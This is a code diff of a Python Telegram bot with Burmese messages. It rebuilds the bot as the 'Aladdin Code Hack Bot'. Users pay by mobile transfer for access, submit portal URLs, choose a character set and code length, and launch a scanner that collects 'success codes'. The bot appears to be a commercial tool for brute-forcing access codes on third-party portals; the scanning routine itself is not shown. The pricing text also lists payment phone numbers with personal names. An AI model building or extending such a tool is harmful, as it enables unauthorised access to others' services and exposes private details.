-        bot.reply_to(message, f"✅ **အောင်မြင်ပါသည်!**\n👤 နာမည်: `{reseller_name}`\n🆔 ID: `{reseller_id}`\n📊 Daily Limit: `{r_limit} ခု` အား သတ်မှတ်ပြီးပါပြီ။ Cloud သို့ သိမ်းဆည်းနေပါသည်...", parse_mode="Markdown")
-        sync_resellers_to_github()
-        
-    except:
-        bot.reply_to(message, "❌ မှားယွင်းနေပါသည်။ Key အရေအတွက် ကန့်သတ်ချက်ကို ဂဏန်းသီးသန့်သာ ပို့ပေးပါ။")
-        return
-        
-    user_states[admin_id] = None
-    if admin_id in reseller_temp_data: del reseller_temp_data[admin_id]
-
-# 2. Reseller List
-@bot.message_handler(func=lambda msg: msg.text == "📊 Reseller List")
-def admin_view_resellers(message):
+# ---------------------- MESSAGE HANDLER FOR ALL INPUTS ----------------------
+@bot.message_handler(content_types=['photo', 'text'])
+async def handle_bot_inputs(message):
     user_id = message.from_user.id
-    user_states[user_id] = None
-    
-    if not is_admin(user_id):
-        return bot.reply_to(message, "🚫 သင်သည် Admin မဟုတ်သဖြင့် ဤစာရင်းအား ကြည့်ရှုခွင့် မရှိပါ။")
+    session = get_session(user_id)
+
+    # 1. Processing Receipt Photo Upload (Photo Event)
+    if message.content_type == 'photo':
+        await bot.reply_to(
+            message, 
+            "📩 <b>Admin ထံသို့ ပို့ပေးနေပါသည် ၊ ခေတ္တ စောင့်ဆိုင်းပေးပါခင်ဗျာ။</b>\n\n"
+            "⚜️ Admin မှ ခွင့်ပြုပြီးပါက Bot အား အသုံးပြုခွင့် ရလာပါမည်။ ကျေးဇူးတင်ပါတယ်! ✨"
+        )
         
-    pull_data_from_github()
-    
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT tg_id, username, role, daily_limit FROM users")
-        rows = cursor.fetchall()
-        conn.close()
-        
-        if not rows: 
-            return bot.reply_to(message, "📭 Database ထဲတွင် အသုံးပြုသူစာရင်း လုံးဝမရှိသေးပါ။")
-        
-        res = f"👥 <b>အသုံးပြုသူ စာရင်းစုစုပေါင်း:</b> {len(rows)} ဦး\n\n"
-        for r in rows:
-            if r[2] == 'admin':
-                role_tag = "👑 Admin"
-                limit_str = "Unlimited"
-            else:
-                role_tag = "👤 Reseller"
-                limit_str = f"{r[3]} ခု/ရက်"
-                
-            clean_name = str(r[1]).replace("<", "&lt;").replace(">", "&gt;")
-            res += f"• <b>{clean_name}</b> (ID: {r[0]}) - [{role_tag}] (Limit: <code>{limit_str}</code>)\n"
-            
-        bot.reply_to(message, res, parse_mode="HTML")
-    except Exception as e:
-        bot.reply_to(message, f"❌ စာရင်းထုတ်ရာတွင် Error တစ်ခု တက်သွားပါသည်: {str(e)}")
+        username = f"@{message.from_user.username}" if message.from_user.username else "No Username"
+        admin_alert = (
+            "📥 <b>[ငွေလွှဲပြေစာ အသစ်ရောက်ရှိလာပါသည်]</b> 📥\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            f"👤 <b>User:</b> {message.from_user.first_name}\n"
+            f"🆔 <b>Telegram ID:</b> <code>{user_id}</code>\n"
+            f"🔗 <b>Username:</b> {username}\n"
+            "━━━━━━━━━━━━━━━━━━━━━━━\n"
+            "⚡ <b>[Admin အတည်ပြုပေးရန် ရိုက်ထည့်ရမည့် ပုံစံ]</b>\n"
+            f"<code>{user_id} | ရက်အရေအတွက် | နေ့စဉ် Limit</code>\n\n"
+            "<i>✍️ ဥပမာ - ၁လစာအတွက် အောက်ပါအတိုင်း ကူးယူ၍ ရိုက်ပို့ပါ-</i>\n"
+            f"<code>{user_id} | 30 | 10</code>"
+        )
+        await bot.send_photo(ADMIN_ID, message.photo[-1].file_id, caption=admin_alert, parse_mode="HTML")
+        return
 
-# 3. Delete Reseller
-@bot.message_handler(func=lambda msg: msg.text == "🗑 Delete Reseller" and is_admin(msg.from_user.id))
-def admin_delete_reseller_menu(message):
-    user_states[message.from_user.id] = None
-    pull_data_from_github()
-    
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT tg_id, username FROM users WHERE role = 'reseller'")
-    rows = cursor.fetchall()
-    conn.close()
-    if not rows: return bot.reply_to(message, "📭 ဖျက်ရန် Reseller စာရင်း မရှိသေးပါ။")
+    # 2. Text Input Logic
+    if message.content_type == 'text':
+        text_data = message.text.strip()
 
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    for r in rows:
-        markup.add(types.InlineKeyboardButton(text=f"❌ {r[1]} (ID: {r[0]})", callback_data=f"del_reseller_{r[0]}"))
-    bot.send_message(message.chat.id, "🗑 **ဖျက်ထုတ်လိုသော Reseller နာမည်အား နှိပ်ပါ-**", reply_markup=markup, parse_mode="Markdown")
+        # --- ADMIN DIRECT ACTIVATION COMMAND LOGIC ---
+        if user_id == ADMIN_ID and "|" in text_data:
+            parts = [p.strip() for p in text_data.split("|")]
+            if len(parts) == 3:
+                try:
+                    target_id = int(parts[0])
+                    days_input = parts[1]
+                    daily_limit = int(parts[2])
+                    
+                    expiry_result = data_manager.authorize(target_id, days_input, daily_limit)
+                    
+                    await bot.reply_to(
+                        message, 
+                        f"✅ <b>User အား အောင်မြင်စွာ ခွင့်ပြုလိုက်ပါပြီ။</b>\n\n"
+                        f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
+                        f"⏳ <b>Expiry:</b> <code>{expiry_result}</code>\n"
+                        f"🎯 <b>Daily Limit:</b> <code>{daily_limit} Hits</code>",
+                        reply_markup=get_admin_panel_keyboard() if text_data.startswith(str(ADMIN_ID)) else None,
+                        parse_mode="HTML"
+                    )
+                    
+                    try:
+                        await bot.send_message(
+                            target_id,
+                            f"🎉 <b>Admin ထံမှ ခွင့်ပြုချက် ရပါပီ ခင်မျာ၊ သင့် Key သက်တမ်းမှာ-</b>\n\n"
+                            f"🆔 <b>User ID:</b> <code>{target_id}</code>\n"
+                            f"⏳ <b>Expired Time:</b> <code>{expiry_result}</code>\n"
+                            f"🎯 <b>Daily Success Code Limit:</b> <code>{daily_limit} Hits</code>",
+                            reply_markup=get_user_keyboard(target_id),
+                            parse_mode="HTML"
+                        )
+                    except Exception as e:
+                        await bot.reply_to(message, f"⚠️ User ထံ စာပို့၍မရပါ (Bot အား Start မလုပ်ရသေးပါ)။")
+                    return
+                except ValueError:
+                    await bot.reply_to(message, "❌ <b>ရိုက်ထည့်သော Format လွဲမှားနေပါသည်။</b> ID နှင့် Limit ကို ကိန်းဂဏန်းများဖြင့်သာ သေချာထည့်ပေးပါ။")
+                    return
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith("del_reseller_"))
-def callback_delete_reseller(call):
-    if not is_admin(call.from_user.id): return bot.answer_callback_query(call.id, "🚫 သင်သည် Admin မဟုတ်သဖြင့် ဖျက်ခွင့်မရှိပါ။")
-    reseller_id = int(call.data.replace("del_reseller_", ""))
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT username FROM users WHERE tg_id = ?", (reseller_id,))
-        name_row = cursor.fetchone()
-        r_name = name_row[0] if name_row else f"{reseller_id}"
-        cursor.execute("DELETE FROM users WHERE tg_id = ?", (reseller_id,))
-        conn.commit()
-        conn.close()
-        
-        sync_resellers_to_github()
-        
-        bot.answer_callback_query(call.id, f"✅ {r_name} အား ဖြုတ်ချပြီးပါပြီ။")
-        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, 
-                              text=f"🗑 **အောင်မြင်ပါသည်!**\n👤 Reseller: `_{r_name}_` (ID: `{reseller_id}`) အား စနစ်အတွင်းမှ ဖျက်ထုတ်ပြီးပါပြီ။", parse_mode="Markdown")
-    except Exception as e: bot.answer_callback_query(call.id, f"❌ Error: {str(e)}")
-
-# 4. View All Keys
-@bot.message_handler(func=lambda msg: msg.text == "🌐 View All Keys" and is_admin(msg.from_user.id))
-def admin_view_all_keys(message):
-    try:
-        user_states[message.from_user.id] = None
-        pull_data_from_github()
-        
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        
-        query = """
-            SELECT added_by, COUNT(*) as total_keys 
-            FROM auth_keys 
-            GROUP BY added_by
-            ORDER BY total_keys DESC
-        """
-        cursor.execute(query)
-        rows = cursor.fetchall()
-        conn.close()
-
-        if not rows:
-            return bot.reply_to(message, "📭 Database ထဲတွင် Key မရှိသေးပါ။")
-
-        res = "📊 <b>RESELLER KEYS SUMMARY REPORT</b>\n"
-        res += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        res += "<b>No  |  Name (ID)  |  Added ID Count</b>\n"
-        res += "━━━━━━━━━━━━━━━━━━━━━━━━\n"
-        
-        total_all_keys = 0 
-        
-        for index, r in enumerate(rows, 1):
-            reseller_id = r[0]
-            key_count = r[1]
-            total_all_keys += key_count
-            
-            raw_owner_name = get_user_name(reseller_id)
-            if not raw_owner_name or str(raw_owner_name).lower() == 'unknown' or str(raw_owner_name).lower() == 'none':
-                owner_name = "Unknown User"
-            else:
-                owner_name = raw_owner_name
-            
-            safe_name = html.escape(str(owner_name))
-            
-            res += f"{index}.  <b>{safe_name}</b>\n"
-            res += f"    ┗ 🆔 <code>{reseller_id}</code>  ➡️  <b>{key_count} ခု</b>\n"
-            res += "────────────────────────\n"
-
-        res += f"📊 <b>စုစုပေါင်း Key အားလုံး: {total_all_keys} ခု</b>\n"
-        res += "━━━━━━━━━━━━━━━━━━━━━━━━"
-
-        bot.send_message(message.chat.id, res, parse_mode="HTML")
-
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error ဖြစ်သွားပါသည်: {str(e)}")
-
-# 5. Add Key 
-@bot.message_handler(func=lambda msg: msg.text == "➕ Add Key" and is_reseller(msg.from_user.id))
-def cmd_addkey(message):
-    user_id = message.from_user.id
-    pull_data_from_github()
-    
-    if not is_admin(user_id):
-        user_limit = get_reseller_daily_limit(user_id)
-        current_count = get_today_added_count(user_id)
-        if current_count >= user_limit:
-            bot.reply_to(message, f"❌ **တားဆီးထားပါသည်!**\n\nသင်သည် ယနေ့အတွက် သတ်မှတ်ထားသော သင့်ကိုယ်ပိုင် Key အကန့်အသတ် **{user_limit} ခု** ပြည့်သွားပါပြီ။ မနက်ဖြန်မှသာ ထပ်မံထည့်သွင်းနိုင်ပါမည်။", parse_mode="Markdown")
+        # --- ADMIN BAN COMMAND LOGIC ---
+        if user_id == ADMIN_ID and session.state == "waiting_for_ban_id":
+            try:
+                target_ban_id = int(text_data)
+                if str(target_ban_id) in data_manager.data["authorized_users"]:
+                    data_manager.deauthorize(target_ban_id)
+                    
+                    if target_ban_id in user_sessions:
+                        us = user_sessions[target_ban_id]
+                        us.stop_event.set()
+                        if us.scan_task: us.scan_task.cancel()
+                        del user_sessions[target_ban_id]
+                        
+                    await bot.reply_to(message, f"✅ <b>User {target_ban_id} အား အောင်မြင်စွာ ပယ်ဖျက်ပြီးပါပြီ။</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")
+                else:
+                    await bot.reply_to(message, "❌ အဆိုပါ ID မှာ ခွင့်ပြုထားသော စာရင်းထဲတွင် မရှိပါ။")
+            except:
+                await bot.reply_to(message, "❌ တရားဝင်သော numeric ID ကိုသာ ရိုက်ထည့်ပါ။")
+            session.state = None
             return
 
-    user_states[user_id] = 'waiting_for_key'
-    msg_text = ("✍️ ကျေးဇူးပြု၍ Key အချက်အလက်ကို အောက်ပါပုံစံအတိုင်း တိကျစွာ ပို့ပေးပါ-\n\n`ID | Key | Unit | Duration`\n\n💡 **ပုံစံနမူနာ:**\n• `F4AFA83F4F1577DE | XYZ-KEY-999 | 3 | d`")
-    bot.reply_to(message, msg_text, parse_mode="Markdown")
+        # --- USER INPUT PORTAL URL ---
+        if session.state == "waiting_for_url":
+            if not (text_data.startswith("http://") or text_data.startswith("https://")):
+                await bot.reply_to(message, "❌ Invalid URL. Must start with http:// or https://")
+            elif data_manager.add_user_url(user_id, text_data):
+                await bot.reply_to(message, "✅ URL added successfully!", reply_markup=get_user_keyboard(user_id))
+            else:
+                await bot.reply_to(message, "⚠️ This URL is already in your list.", reply_markup=get_user_keyboard(user_id))
+            session.state = None
+            return
 
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_key' and msg.text not in MENU_BUTTONS)
-def process_key_data(message):
-    user_id = message.from_user.id
-    
-    if not is_admin(user_id):
-        user_limit = get_reseller_daily_limit(user_id)
-        if get_today_added_count(user_id) >= user_limit:
-            user_states[user_id] = None
-            return bot.reply_to(message, f"❌ သင်သည် ယနေ့အတွက် သတ်မှတ်ထားသော Key အကန့်အသတ် {user_limit} ခု ပြည့်သွားပါပြီ။")
-
-    parts = [p.strip() for p in message.text.split("|")]
-    if len(parts) != 4: 
-        return bot.reply_to(message, "❌ ပုံစံမမှန်ပါ။ `ID | Key | Unit | Duration` အတိုင်း ပြန်လည်ပေးပို့ပါ။")
-    
-    target_id = parts[0]
-    if not is_admin(user_id) and user_id not in SPECIAL_RESELLERS and target_id.startswith("YG-,AL-"):
-        user_states[user_id] = None
-        return bot.reply_to(message, "❌ **Internet Bypass reseller ဝယ်ယူပါ ")
-    today_date_str = datetime.now().strftime("%Y-%m-%d")
-    
-    try:
-        conn = sqlite3.connect(DB_FILE, timeout=10)
-        cursor = conn.cursor()
-        
-        cursor.execute("SELECT 1 FROM auth_keys WHERE target_id = ?", (target_id,))
-        existing_id = cursor.fetchone()
-        
-        if existing_id:
-            conn.close()
-            user_states[user_id] = None
-            return bot.reply_to(message, "❌ ဤ Device ID သည် Database ထဲတွင် ရှိနှင့်နေပြီးသား ဖြစ်သဖြင့် ထပ်ထည့်၍မရပါ။")
-            
-        cursor.execute(
-            "INSERT INTO auth_keys (target_id, key_string, unit_val, duration_type, added_by, created_at) VALUES (?, ?, ?, ?, ?, ?)", 
-            (parts[0], parts[1], parts[2], parts[3], user_id, today_date_str)
-        )
-        conn.commit()
-        conn.close()
-        
-        success_msg = "✅ Key အချက်အလက် သိမ်းဆည်းပြီးပါပြီ။ Cloud သို့ လှမ်းပို့နေပါသည်..."
-        if not is_admin(user_id):
-            user_limit = get_reseller_daily_limit(user_id)
-            rem = user_limit - get_today_added_count(user_id)
-            success_msg += f"\n\n📊 **ယနေ့အခြေအနေ:** ထည့်ပြီး {get_today_added_count(user_id)} ခု / ထပ်ထည့်နိုင်သေးသည် {rem} ခု (Limit: {user_limit} ခု)"
-            
-        bot.reply_to(message, success_msg)
-        sync_db_to_github()
-        
-    except Exception as e:
-        bot.reply_to(message, f"❌ စနစ်အတွင်း အမှားအယွင်း ဖြစ်ပွားခဲ့သည်- {str(e)}")
-        
-    finally:
-        user_states[user_id] = None
-
-# 6. View My Keys
-@bot.message_handler(func=lambda msg: msg.text == "🔑 My Keys" and is_reseller(msg.from_user.id))
-def cmd_mykeys(message):
-    try:
-        user_states[message.from_user.id] = None
-        pull_data_from_github()
-        
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("SELECT target_id, key_string, added_by, created_at FROM auth_keys WHERE added_by = ?", (message.from_user.id,))
-        rows = cursor.fetchall()
-        conn.close()
-        
-        if not rows: 
-            return bot.reply_to(message, "📭 သင်ထည့်သွင်းထားသော Key မရှိသေးပါ။")
-            
-        header = "🔑 <b>MY AUTHORIZED KEYS LIST</b>\n"
-        header += "━ မိမိထုတ်ထားသော ID/Keyစာရင်း ━\n\n"
-        
-        if not is_admin(message.from_user.id):
-            user_limit = get_reseller_daily_limit(message.from_user.id)
-            today_count = get_today_added_count(message.from_user.id)
-            header += f"📊 <b>ယနေ့ Limit အခြေအနေ:</b> <code>{today_count} / {user_limit}</code> ခု\n"
-            header += "┠────────────────────────┨\n\n"
-        else:
-            header += "\n"
-            
-        res = header
-        
-        for index, r in enumerate(rows, 1):
-            date_str = r[3] if r[3] else "-"
-            
-            safe_target = html.escape(str(r[0]))
-            safe_key = html.escape(str(r[1]))
-            safe_date = html.escape(str(date_str))
-            
-            line = (
-                f"<b>{index}. 🔑 Key:</b> <code>{safe_key}</code>\n"
-                f"┗ 🎯 <b>Device ID:</b> <code>{safe_target}</code>\n"
-                f"┗ 📅 <b>Date:</b> <code>{safe_date}</code>\n"
-                f"────────────────────────\n"
+        # --- PUBLIC COMMANDS / UN-AUTHORIZED KEYBOARD ---
+        if text_data == "🛒 Access Key ဝယ်ယူရန်":
+            text = (
+                "⚡ <b>Aladdin Code Hack Bot ဈေးနှုန်းများ</b> ⚡\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "📅 <b>15 Days</b> - <code>15,000 Ks</code>\n"
+                "📅 <b>30 Days</b> - <code>21,000 Ks</code>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "💰 <b>ငွေလွှဲရန် - KPay</b>\n"
+                "📱 <code>09973214939</code>\n"
+                "👤 <b>Hein Min Thant</b>\n\n"
+                "💰 <b>ငွေလွှဲရန် - Wave</b>\n"
+                "📱 <code>09264389341</code>\n"
+                "👤 <b>Hein Min Chit</b>\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━\n"
+                "⚠️ Ngwe Lwe Pyay Sar Po Yan ခလုတ်နှိပ်၍ ပေးပို့ပေးပါဦးခင်ဗျာ။"
             )
+            await bot.reply_to(message, text, parse_mode="HTML")
+            return
             
-            if len(res) + len(line) > 4000:
-                bot.send_message(message.chat.id, res, parse_mode="HTML")
-                res = "" 
-            res += line
+        elif text_data == "💵 Ngwe Lwe Pyay Sar Po Yan":
+            await bot.reply_to(message, "📸 <b>ကျေးဇူးပြု၍ Ngwe Lwe Pyay Sar (Screenshot Photo) အား တိုက်ရိုက် ပို့ပေးပါခင်ဗျာ။</b>")
+            return
+
+        # Core Authorize Gate for menus
+        if not data_manager.is_authorized(user_id):
+            await bot.reply_to(message, "❌ သင့်တွင် ဤ Bot အား သုံးခွင့်မရှိသေးပါ။ ပြေစာ ပေးပို့ပေးပါ။", reply_markup=get_unauth_keyboard())
+            return
+
+        # --- STANDARD KEYBOARD NAVIGATION ---
+        if text_data == "🔗 ADD PORTAL URL":
+            session.state = "waiting_for_url"
+            await bot.reply_to(message, "Please send the Portal URL you want to add.")
             
-        if res:
-            bot.send_message(message.chat.id, res, parse_mode="HTML")
+        elif text_data == "📄 MY URLS":
+            u_data = data_manager.get_user_data(user_id)
+            urls = u_data["urls"]
+            if not urls:
+                text = "You haven't added any URLs yet."
+                markup = None
+            else:
+                text = "<b>Your URLs:</b>\n\n" + "\n".join([f"{i+1}. {u[:70]}..." for i, u in enumerate(urls)])
+                markup = InlineKeyboardMarkup()
+                markup.row(InlineKeyboardButton(text="🗑 CLEAR ALL URLS", callback_data="clear_urls"))
+            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
+
+        # New Keyboard Logic to View Saved Success Codes
+        elif text_data == "📄 MY SUCCESS CODES":
+            u_data = data_manager.get_user_data(user_id)
+            success_list = u_data.get("success_codes", [])
+            if not success_list:
+                text = "⚠️ <b>သင့်ထံတွင် ရှာဖွေတွေ့ရှိထားသော Success Code မရှိသေးပါခင်ဗျာ။</b>"
+                markup = None
+            else:
+                text = "🎯 <b>သင်ရှာဖွေတွေ့ရှိထားသော Success Codes များ-</b>\n"
+                text += "<i>(စာလုံးပေါ်ဖိရုံဖြင့် အလွယ်တကူ Copy ကူးယူနိုင်ပါသည်)</i>\n\n"
+                for i, code in enumerate(success_list):
+                    text += f"{i+1}. <code>{code}</code>\n"
+                
+                markup = InlineKeyboardMarkup()
+                markup.row(InlineKeyboardButton(text="🗑 CLEAR SUCCESS CODES (ဖျက်ပစ်ရန်)", callback_data="clear_success_codes"))
+            await bot.reply_to(message, text, reply_markup=markup, parse_mode="HTML")
             
-    except Exception as e:
-        bot.reply_to(message, f"❌ Error ဖြစ်သွားပါသည်: {str(e)}")
+        elif text_data == "⚙️ SETUP CONFIG MOD":
+            markup = InlineKeyboardMarkup()
+            markup.row(InlineKeyboardButton(text="🔢 Numbers (0-8)", callback_data="set_m_num"))
+            markup.row(InlineKeyboardButton(text="🔤 Alpha (a-z)", callback_data="set_m_alpha"))
+            markup.row(InlineKeyboardButton(text="🔀 Mixed", callback_data="set_m_mixed"))
+            await bot.reply_to(message, "Select Character Set:", reply_markup=markup)
+            
+        elif text_data == "🚀 START SCAN":
+            u_data = data_manager.get_user_data(user_id)
+            if not u_data["urls"]:
+                await bot.reply_to(message, "⚠️ Add at least one URL first!")
+                return
+            
+            today_hits = data_manager.get_today_hits(user_id)
+            user_info = data_manager.get_user_info(user_id)
+            max_limit = user_info.get("daily_limit", 10)
+            
+            # Admin ဖြစ်ခဲ့ရင် Limit Check ကို ကျော်သွားစေချင်ရင် (သို့) ♾️ အမြဲအလုပ်လုပ်စေချင်ရင်
+            if user_id != ADMIN_ID and today_hits >= max_limit:
+                await bot.reply_to(message, f"⚠️ ယနေ့အတွက် သတ်မှတ်ထားသော အမြင့်ဆုံး Limit ({max_limit}) ပြည့်သွားပါပြီ။")
+                return
 
-# 7. Edit Key
-@bot.message_handler(func=lambda msg: msg.text == "✏️ Edit Key" and is_reseller(msg.from_user.id))
-def cmd_editkey(message):
-    user_states[message.from_user.id] = 'waiting_for_edit_data'
-    msg_text = ("✏️ **ပြင်ဆင်လိုသော အချက်အလက်ကို အောက်ပါပုံစံအတိုင်း ပို့ပေးပါ-**\n\n"
-                "`ရှာမည့်DeviceID | Keyသစ် | Unitသစ် | Durationသစ်`\n\n"
-                "💡 **ပုံစံနမူနာ:**\n`F4AFA83F4F1577DE | NEW-KEY-888 | 5 | m`")
-    bot.reply_to(message, msg_text, parse_mode="Markdown")
+            if session.scan_task and not session.scan_task.done():
+                await bot.reply_to(message, "⚠️ Scanner is already running.")
+                return
+            
+            session.reset_stats()
+            status_msg = await bot.reply_to(message, "🚀 Initializing Scanner Dashboard...", parse_mode="HTML")
+            session.status_msg_id = status_msg.message_id
+            session.scan_task = asyncio.create_task(main_scanner_task(user_id))
 
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_edit_data' and msg.text not in MENU_BUTTONS)
-def process_edit_key(message):
-    user_id = message.from_user.id
-    parts = [p.strip() for p in message.text.split("|")]
-    if len(parts) != 4: 
-        user_states[user_id] = None
-        return bot.reply_to(message, "❌ ပုံစံမမှန်ပါ။ `DeviceID | Keyသစ် | Unitသစ် | Durationသစ်` အတိုင်း ပြန်လည်စစ်ဆေးပါ။")
-    
-    target_device_id = parts[0]  
-    new_key = parts[1]           
-    new_unit = parts[2]          
-    new_duration = parts[3]      
-    
-    pull_data_from_github()
-    
-    conn = sqlite3.connect(DB_FILE)
-    cursor = conn.cursor()
-    cursor.execute("SELECT added_by FROM auth_keys WHERE target_id = ?", (target_device_id,))
-    result = cursor.fetchone()
-    conn.close()
-    
-    owner_id = result[0] if result else None
-    if owner_id is None: 
-        user_states[user_id] = None
-        return bot.reply_to(message, "❌ ဤ Device ID ကို Database ထဲတွင် ရှာမတွေ့ပါ။")
-    if owner_id != user_id and not is_admin(user_id): 
-        user_states[user_id] = None
-        return bot.reply_to(message, "🚫 သင်သည် ဤ Key အား ပြင်ဆင်ခွင့်မရှိပါ။")
-        
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("""
-            UPDATE auth_keys 
-            SET key_string=?, unit_val=?, duration_type=? 
-            WHERE target_id=?
-        """, (new_key, new_unit, new_duration, target_device_id))
-        conn.commit()
-        conn.close()
-        
-        bot.reply_to(message, f"✏️ Device ID `{target_device_id}` ၏ အချက်အလက်များကို ပြင်ဆင်ပြီးပါပြီ။ Cloud သို့ Update လုပ်နေသည်...")
-        sync_db_to_github()
-        user_states[user_id] = None
-    except Exception as e: 
-        user_states[user_id] = None
-        bot.reply_to(message, f"❌ ပြင်ဆင်မှု မှားယွင်းနေပါသည်- {str(e)}")
+        elif text_data == "🔑 ADMIN PANEL" and user_id == ADMIN_ID:
+            session.state = None
+            await bot.reply_to(message, "👑 <b>WELCOME TO ADMIN MASTER SYSTEM</b>", reply_markup=get_admin_panel_keyboard(), parse_mode="HTML")
 
-# 8. Delete Key
-@bot.message_handler(func=lambda msg: msg.text == "🗑 Delete Key" and is_reseller(msg.from_user.id))
-def cmd_delete_key_trigger(message):
-    user_states[message.from_user.id] = 'waiting_for_del_id'
-    bot.reply_to(message, "🗑 ဖျက်လိုသော **Device ID** (ဥပမာ - `F4AFA83F4F1577DE`) ကို ပို့ပေးပါ-")
+        elif text_data == "👥 Admin ခွင့်ပြုပေးထားသော User များ" and user_id == ADMIN_ID:
+            users = data_manager.data["authorized_users"]
+            if not users:
+                await bot.reply_to(message, "လက်ရှိတွင် ခွင့်ပြုထားသော User မရှိသေးပါ။")
+                return
+            report = "👥 <b>ခွင့်ပြုထားသော User စာရင်း-</b>\n\n"
+            for uid, info in users.items():
+                report += f"• <code>{uid}</code> | {info.get('expiry')} | Limit: {info.get('daily_limit')} Hits\n"
+            await bot.reply_to(message, report, parse_mode="HTML")
 
-@bot.message_handler(func=lambda msg: user_states.get(msg.from_user.id) == 'waiting_for_del_id' and msg.text not in MENU_BUTTONS)
-def process_delete_key_by_id(message):
-    user_id = message.from_user.id
-    id_to_del = message.text.strip()
-    
-    pull_data_from_github()
-    
-    owner_id = get_key_owner_by_id(id_to_del)
-    if owner_id is None: return bot.reply_to(message, f"❌ ID `{id_to_del}` အား ရှာမတွေ့ပါ။")
-    if owner_id != user_id and not is_admin(user_id): return bot.reply_to(message, "🚫 ဖျက်ခွင့်မရှိပါ။")
-    try:
-        conn = sqlite3.connect(DB_FILE)
-        cursor = conn.cursor()
-        cursor.execute("DELETE FROM auth_keys WHERE target_id = ?", (id_to_del,))
-        conn.commit()
-        conn.close()
-        bot.reply_to(message, f"✅ ID `{id_to_del}` ၏ Key အား ဖျက်ပြီးပါပြီ။ Cloud သို့ ပို့နေသည်...")
-        sync_db_to_github()
-        user_states[user_id] = None
-    except Exception as e: bot.reply_to(message, f"❌ Error: {str(e)}")
+        elif text_data == "🚫 ခွင့်ပြုထားသော user များအား ပယ်ဖျက်ရန်" and user_id == ADMIN_ID:
+            users = data_manager.data["authorized_users"]
+            if not users:
+                await bot.reply_to(message, "ပယ်ဖျက်ရန် User စာရင်း မရှိသေးပါ။")
+                return
+            
+            report = "🚫 <b>လက်ရှိအသုံးပြုနေသော User ID များ-</b>\n\n"
+            for uid, info in users.items():
+                report += f"• <code>{uid}</code> ({info.get('expiry')})\n"
+            
+            report += "\n━━━━━━━━━━━━━━━━━━━━━━━\n"
+            report += "✍️ <b>ပယ်ဖျက်လိုပါက အောက်ပါအတိုင်း ID တစ်ခုတည်းကို သီးသန့် ရိုက်ပို့ပေးပါ-</b>\n"
+            report += "ဥပမာ - <code>685224104</code>"
+            
+            session.state = "waiting_for_ban_id"
+            await bot.reply_to(message, report, parse_mode="HTML")
 
-# --- Main Run ---
+        elif text_data == "🔙 BACK TO MAIN" or text_data == "🔙 BACK":
+            session.state = None
+            await bot.reply_to(message, "Main Menu သို့ ပြန်ရောက်ပါပြီ။", reply_markup=get_user_keyboard(user_id))
+
+# ---------------------- INLINE CALLBACK BUTTONS HANDLERS ----------------------
+@bot.callback_query_handler(func=lambda call: call.data == "clear_success_codes")
+async def inline_clear_success_codes(call):
+    user_id = call.from_user.id
+    data_manager.clear_success_codes(user_id)
+    await bot.answer_callback_query(call.id, "Success Codes အားလုံးကို ဖျက်ပြီးပါပြီ။", show_alert=True)
+    await bot.edit_message_text("🗑 <b>ရှာဖွေထားသော Success Code အားလုံးကို သန့်ရှင်းဖျက်ဆီးပြီးပါပြီ။</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+
+@bot.callback_query_handler(func=lambda call: call.data == "clear_urls")
+async def inline_clear_urls(call):
+    user_id = call.from_user.id
+    data_manager.clear_user_urls(user_id)
+    await bot.answer_callback_query(call.id, "All URLs cleared!")
+    await bot.edit_message_text("🗑 All URLs have been deleted successfully.", chat_id=call.message.chat.id, message_id=call.message.message_id)
+
+@bot.callback_query_handler(func=lambda call: call.data == "stop_scan")
+async def inline_stop_scan(call):
+    user_id = call.from_user.id
+    session = get_session(user_id)
+    session.stop_event.set()
+    if session.scan_task:
+        session.scan_task.cancel()
+        try: await session.scan_task
+        except asyncio.CancelledError: pass
+    session.scan_task = None
+    await bot.answer_callback_query(call.id, "🛑 Scanner paused.")
+    await bot.edit_message_text("🛑 <b>Scanner Stopped & Paused Successfully!</b>", chat_id=call.message.chat.id, message_id=call.message.message_id, parse_mode="HTML")
+
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_num")
+async def cb_set_m_num(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", "012345678")
+    await prompt_length_selection(call)
+
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_alpha")
+async def cb_set_m_alpha(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", string.ascii_lowercase)
+    await prompt_length_selection(call)
+
+@bot.callback_query_handler(func=lambda call: call.data == "set_m_mixed")
+async def cb_set_m_mixed(call):
+    user_id = call.from_user.id
+    data_manager.update_user_settings(user_id, "char_set", "012345678" + string.ascii_lowercase)
+    await prompt_length_selection(call)
+
+async def prompt_length_selection(call):
+    markup = InlineKeyboardMarkup()
+    for i in [6, 7, 8]:
+        markup.row(InlineKeyboardButton(text=f"{i} Digits", callback_data=f"set_l_{i}"))
+    await bot.edit_message_text("Select Code Length:", chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("set_l_"))
+async def cb_set_len(call):
+    user_id = call.from_user.id
+    length = int(call.data.split("_")[-1])
